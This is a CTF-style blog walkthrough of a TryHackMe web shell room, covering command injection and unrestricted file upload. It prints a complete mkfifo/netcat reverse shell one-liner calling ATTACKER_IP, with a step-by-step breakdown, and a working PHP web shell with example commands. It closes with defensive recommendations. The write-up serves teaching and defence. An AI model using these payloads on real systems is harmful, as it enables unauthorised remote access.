---
title: "TryHackMe - Practical WebShell Walkthrough"
date: 2026-06-28 00:01:00 +0700
categories: [TryHackMe, Web Exploitation]
tags:
  - tryhackme
  - reverse-shell
  - web-shell
  - command-injection
  - file-upload
  - linux
image:
#path: /assets/img/posts/thm-webshell-cover.png
author: NoxShepherd
toc: true
comments: true
---

# Overview

This walkthrough documents the exploitation of two common web application vulnerabilities found in the TryHackMe **Practical Task WebShell** room.

The objective is to gain remote code execution through:

- Command Injection
- Unrestricted File Upload

Both scenarios demonstrate different techniques for obtaining a shell on the target system while highlighting the associated security risks and mitigation strategies.

> **Disclaimer**
>
> This write-up is intended for educational purposes only. All activities were performed inside the TryHackMe training environment.

---

# Lab Information

| Item | Value |
|------|------|
| Platform | TryHackMe |
| Difficulty | Easy |
| Target OS | Linux |
| Techniques | Reverse Shell, Web Shell |

---

# Enumeration

The first step was identifying the exposed services.

```bash
nmap -sV TARGET_IP
```

Example output:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
8081/tcp open  http
8082/tcp open  http
```

From the scan results, two interesting services were identified:

- Port **8081** – vulnerable to Command Injection
- Port **8082** – vulnerable to Unrestricted File Upload

---

# Exploitation — Command Injection

A Netcat listener was started on the attacker machine.

```bash
nc -lvnp 443
```

The vulnerable application allowed arbitrary command execution.

The following reverse shell payload was submitted through the web application:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

## Payload Breakdown

### Remove existing FIFO

```bash
rm -f /tmp/f
```

Deletes any existing named pipe.

---

### Create a FIFO

```bash
mkfifo /tmp/f
```

Creates a communication channel between Netcat and the shell.

---

### Read input

```bash
cat /tmp/f
```

Reads commands from the pipe.

---

### Interactive shell

```bash
sh -i 2>&1
```

Starts an interactive shell and redirects stderr.

---

### Connect back

```bash
nc ATTACKER_IP 443 >/tmp/f
```

Creates the reverse connection to the attacker.

---

# Verifying Shell Access

After the listener received the connection, several Linux commands were executed to verify access.

```bash
whoami
```

```bash
pwd
```

```bash
id
```

```bash
ls /
```

The presence of the flag file confirmed successful exploitation.

> **The flag value has intentionally been omitted to preserve the learning experience.**

---

# Exploitation — Web Shell

The second challenge involved an unrestricted file upload vulnerability.

A simple PHP web shell was created.

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

After uploading the file, commands could be executed directly through the browser.

Example:

```text
http://TARGET_IP:8082/uploads/shell.php?cmd=whoami
```

Additional verification commands included:

```text
?cmd=pwd
```

```text
?cmd=ls%20/
```

```text
?cmd=cat%20/flag.txt
```

Again, the flag value has been intentionally removed.

---

# MITRE ATT&CK Mapping

| Technique | MITRE ID |
|-----------|-----------|
| Command and Scripting Interpreter | T1059 |
| Exploitation for Client Execution | T1203 |
| Web Shell | T1505.003 |

---

# Defensive Recommendations

To reduce the risk of these vulnerabilities:

- Validate all user input.
- Avoid passing user-controlled input to system commands.
- Implement allow-list validation.
- Disable unrestricted file uploads.
- Restrict executable file types.
- Store uploaded files outside the web root.
- Apply the principle of least privilege.
- Monitor web server logs for suspicious activity.

---

# Lessons Learned

This lab demonstrates that even simple web vulnerabilities can quickly lead to remote code execution.

Although reverse shells and web shells achieve similar objectives, they rely on different exploitation paths and require different defensive controls.

Understanding both offensive techniques and defensive mitigations is essential for improving overall web application security.